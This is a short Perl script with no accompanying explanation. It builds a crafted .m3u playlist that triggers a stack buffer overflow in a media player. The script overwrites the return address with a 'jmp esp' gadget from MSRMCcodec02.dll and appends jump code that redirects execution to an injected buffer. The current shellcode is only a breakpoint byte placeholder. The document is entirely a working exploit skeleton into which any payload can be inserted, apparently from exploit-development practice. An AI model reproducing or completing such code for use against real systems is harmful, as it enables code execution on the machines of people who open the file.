my $file= "test1.m3u";
my $buffersize = 26074;

my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";  #position 300

my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));

my $eip = pack('V',0x01AAF23A);  #jmp esp from MSRMCcodec02.dll

my $preshellcode = "X" x 4;       # added so jumpcode matches to ESP perfectly
my $jumpcode = "\x83\xc4\x5e" .   #add esp,0x5e
   "\x83\xc4\x5e" .               #add esp,0x5e
   "\x83\xc4\x5e" .               #add esp,0x5e
   "\xff\xe4";                    #jmp esp

my $buffer = $junk.$nop.$shellcode.$restofbuffer;

print "Size of buffer : ".length($buffer)."\n";

open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$jumpcode;
close($FILE);
print "m3u File Created successfully\n";

